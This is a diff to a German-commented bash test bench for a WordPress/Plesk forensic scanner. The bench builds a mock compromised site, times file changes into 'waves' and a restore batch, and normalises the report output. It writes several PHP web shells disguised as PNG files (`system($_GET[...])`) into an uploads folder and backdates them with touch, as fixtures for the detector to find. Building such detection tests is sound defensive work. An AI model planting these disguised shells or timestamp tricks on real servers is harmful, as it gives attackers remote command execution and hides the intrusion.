@@ -485,6 +485,27 @@ PHP
   # Als Nicht-PHP getarnte Nutzlast.
   printf '\x89PNG\r\n\x1a\n<?php system($_GET["x"]); ?>\n' \
     > "${k2}/wp-content/uploads/2026/03/logo.png"
+
+  # ── Ein Massenvorgang fuer 13e.1 (#65) ───────────────────────────────
+  #
+  # Am 13.08.2026 standen ueber 200 Dateien vom 19.02.2026 innerhalb von
+  # 41 Sekunden am Anfang der Zeitachse — eine Wiederherstellung. 13e.1 zaehlte
+  # sie als ersten Schreibvorgang, und 13e.4 datierte darauf.
+  #
+  # Fuenf getarnte Nutzlasten, die im selben Zug zurueckgespielt wurden: sie
+  # sind Befund (7.13 findet sie), tragen aber alle die ALTE mtime und eine
+  # gemeinsame, neue ctime. Genau daran erkennt 13e.1 den Vorgang.
+  #
+  # NT_PRUEFSTAND_OHNE_MASSENVORGANG=1 gibt ihnen stattdessen eine frische
+  # mtime. Dann sind es fuenf Anker statt fuenf Kopien — dieselbe Menge,
+  # dieselbe Sekunde, andere Einordnung. Die Gegenprobe prueft damit den
+  # UNTERSCHEIDER und nicht bloss, ob die Dateien da sind.
+  local wh="${k2}/wp-content/uploads/2026/03/wiederherstellung"
+  mkdir -p "$wh"
+  local i
+  for i in 1 2 3 4 5; do
+    printf '\x89PNG\r\n\x1a\n<?php system($_GET["r%s"]); ?>\n' "$i" > "${wh}/bild${i}.png"
+  done
   # ── robots.txt: vergiftet und legitim ────────────────────────────────
   # Kunde 2 traegt die Kampagnen-Fassung aus dem echten Befall: die Sitemap
   # zeigt ueber index.php/ auf einen Pfad, zu dem es keine Datei gibt — der
@@ -1091,24 +1112,44 @@ LOG
     # Pruefgegenstand.
     local _stempel; _stempel="$(date '+%Y%m%d')0000.00"
     find "$W" -type f ! -name 'eintrag-*.dat' -exec touch -t "$_stempel" {} + 2>/dev/null || true
-    # Erste Welle. Die robots.txt zuerst: sie ist im Anlassfall der aelteste
-    # Beleg, weil sie einmal angefasst und danach nie wieder angesehen wurde.
+    # ZUERST der Massenvorgang — so wie auf dem echten Server, wo die
+    # Wiederherstellung vom 19.02.2026 am Anfang der Achse stand und
+    # `aeltester_nachweis` auf ihr Datum zog. Stuende er am Ende, bliebe genau
+    # die Korrektur ungeprueft, um die es in #65 geht.
+    #
+    # EIN touch-Aufruf fuer alle fuenf, damit sie dieselbe ctime-Sekunde
+    # teilen — so entsteht ein Block ohne Spanne.
+    local _wh="${k2c}/httpdocs/wp-content/uploads/2026/03/wiederherstellung"
+    if [[ "${NT_PRUEFSTAND_OHNE_MASSENVORGANG:-0}" != "1" ]]; then
+      # Alte mtime, neue ctime → INODE. Fuenf von fuenf, also Mehrheit.
+      touch -t 202402190838.41 "${_wh}"/bild*.png
+    else
+      # Frisch geschrieben → ANKER. Derselbe Block, andere Einordnung:
+      # 13e.1 muss ihn dann Datei fuer Datei auf der Achse lassen, und
+      # `aeltester_nachweis` faellt auf seine Zeit zurueck.
+      touch "${_wh}"/bild*.png
+    fi
+    sleep 10
+    # Erste echte Welle. Die robots.txt zuerst: sie ist im Anlassfall der
+    # aelteste Beleg, weil sie einmal angefasst und nie wieder angesehen wurde.
     touch "${k2c}/httpdocs/robots.txt";                                        sleep 1
     touch "${k2c}/cloud.kunde-zwei.example/filefuns.php";                      sleep 1
     touch "${k2c}/backups/updater-abc123/nextcloud-28.0.1.2-1700000000/filefuns.php"; sleep 1
     touch "${k2c}/httpdocs/wp-content/plugins/beispiel-plugin/assets/banner.png"; sleep 1
     touch "${k2c}/httpdocs/wp-content/uploads/2026/03/clip.avi";               sleep 1
     touch "${k2c}/httpdocs/wp-content/uploads/2026/03/clip.mov"
-    # Zweite Welle, sechs Sekunden spaeter. Mit URSACHE_WELLE_SEK=4 im Lauf
+    # Zweite Welle, zehn Sekunden spaeter. Mit URSACHE_WELLE_SEK=6 im Lauf
     # trennt 13e.1 hier — und NUR hier. Damit ist beides geprueft: dass ein
     # kleiner Abstand die Welle nicht aufschneidet, und dass ein grosser es tut.
     #
-    # Warum 1 gegen 6 und nicht 1 gegen 3: `sleep 1` schlaeft MINDESTENS eine
-    # Sekunde. Mit dem Prozessstart der Schleife werden daraus gelegentlich
-    # zwei, und bei einer Schwelle von 2 schnitt das die erste Welle auf —
-    # gemessen in 1 von 10 Durchlaeufen. Die Schwelle liegt deshalb bei 4, mit
-    # Abstand nach beiden Seiten.
-    sleep 6
+    # Warum 1 gegen 10 bei einer Schwelle von 6: `sleep 1` schlaeft
+    # MINDESTENS eine Sekunde. Unter Last werden daraus auch mal vier — bei
+    # einer Schwelle von 4 schnitt das die erste Welle auf und die Wellenzahl
+    # sprang zwischen 2 und 3 (gemessen: 1 von 5 Durchlaeufen). Beide Margen
+    # sind deshalb verdoppelt: ein Abstand INNERHALB einer Welle muesste jetzt
+    # sechs Sekunden erreichen, ein Abstand ZWISCHEN zwei Wellen duerfte auf
+    # sechs fallen. Beides ist weit ausserhalb dessen, was `sleep` verfehlt.
+    sleep 10
     if [[ "${NT_PRUEFSTAND_OHNE_ZEITDEUTUNG:-0}" != "1" ]]; then
       touch -t 202401010422.05 "${k2c}/httpdocs/wp-content/mu-plugins/cache.php"
       touch -t 202812310422.05 "${k2c}/httpdocs/wp-content/uploads/2026/03/logo.png"
@@ -1195,6 +1236,16 @@ REGELN = [
     # Die Spanne selbst bleibt im Bericht und im Beleg stehen; hier wird nur
     # die normalisierte Fassung vergleichbar gemacht.
     (r'\b\d+ Tage \d+ h\b',                         '<SPANNE>'),
+    # Pausen im SEKUNDENBEREICH gibt es nur im Pruefstand: mit der Vorgabe
+    # URSACHE_WELLE_SEK=3600 ist jede echte Pause mindestens eine Stunde und
+    # wird als "h"/"Tage" gerendert. Der Pruefstand senkt die Schwelle und
+    # baut die Abstaende mit `sleep` — und `sleep 6` schlaeft MINDESTENS
+    # sechs Sekunden, gelegentlich sieben. Gemessen: 4 von 4 Vergleichen
+    # schlugen deshalb aus.
+    #
+    # Maskiert wird nur die ZAHL. Dass eine Pause an dieser Stelle steht — und
+    # damit die Wellentrennung selbst — bleibt vollstaendig verglichen.
+    (r'(── Pause: )\d+ s\b',                        r'\1<SPANNE> s'),
     # Dieselbe Sache in findings.json: die Zeitachse fuehrt ROHE Sekunden,
     # damit die Gegenstelle rechnen kann. Fuer alles, was der Pruefstand in
     # derselben Sekunde anlegt, ist das die Laufzeit — also je Lauf anders.
@@ -1206,7 +1257,11 @@ REGELN = [
     # nacktes <EPOCHE> haette sie unparsbar gemacht — geprueft wird zwar die
     # echte Datei, aber wer die Referenz aufmacht, erwartet zu Recht JSON.
     (r'"(ctime|mtime)":\d+',                        r'"\1":"<EPOCHE>"'),
-    (r'"(aeltester|juengster)_nachweis": *\d+',     r'"\1_nachweis": "<EPOCHE>"'),
+    # Das (_roh)? ist nicht kosmetisch: aeltester_nachweis_roh kam mit #65
+    # dazu und wurde von der Regel ohne diese Gruppe NICHT erfasst. Der Wert
+    # ist eine lebende Epoche — die Referenz waere bei jedem Lauf anders
+    # gewesen, und der Vergleich haette dauerhaft ausgeschlagen.
+    (r'"(aeltester|juengster)_nachweis(_roh)?": *\d+', r'"\1_nachweis\2": "<EPOCHE>"'),
     (r'\| \*\*(Analysiert am|Server)\*\* \|.*$',   r'| **\1** | <UMGEBUNG> |'),
     # Aus `find -ls`: Inode und Blockzahl sind Eigenschaften des Dateisystems,
     # Eigentuemer und Gruppe die des ausfuehrenden Kontos, der Zeitstempel der
@@ -1271,10 +1326,10 @@ lauf_ausfuehren() {
   # URSACHE_WELLE_SEK=2: echte Wellenabstaende kann der Pruefstand nicht bauen,
   # dafuer braeuchte er Luecken in der ctime — und die laesst sich nicht setzen.
   # Er baut deshalb Abstaende von einer Sekunde und EINEN von drei (siehe
-  # baum_bauen) und senkt die Schwelle auf vier. Damit ist beides geprueft: dass
-  # eine Sekunde die Welle NICHT aufschneidet und sechs es tun. Der Abstand nach
-  # beiden Seiten ist Absicht: `sleep 1` schlaeft mindestens eine Sekunde, nicht
-  # genau eine. Mit der Vorgabe
+  # baum_bauen) und senkt die Schwelle auf sechs. Damit ist beides geprueft:
+  # dass eine Sekunde die Welle NICHT aufschneidet und zehn es tun. Der grosse
+  # Abstand nach beiden Seiten ist Absicht: `sleep 1` schlaeft mindestens eine
+  # Sekunde, nicht genau eine — unter Last auch mal vier. Mit der Vorgabe
   # von einer Stunde bliebe die Wellentrennung in 13e.1 ganz ungeprueft.
   # Vertretbar, weil an dem Wert kein Befund haengt — er steuert nur, ob eine
   # Pause als eigene Zeile erscheint.
@@ -1294,7 +1349,8 @@ lauf_ausfuehren() {
   NT_WF_ATTRAPPE="${NT_WF_ATTRAPPE-$WFDATEN}" \
   NT_DB_ATTRAPPE="${NT_DB_ATTRAPPE-$DBDATEN}" \
   PATH="${ATTRAPPE}:$PATH" \
-  URSACHE_WELLE_SEK=4 \
+  URSACHE_WELLE_SEK=6 \
+  URSACHE_MASSE_MIN=4 \
   bash "${SELF_DIR}/wp_plesk_forensik.sh" \
        --path "$W" --nur-website --kein-menue >"${ABLAGE}/konsole.txt" 2>&1
   local rc=$?
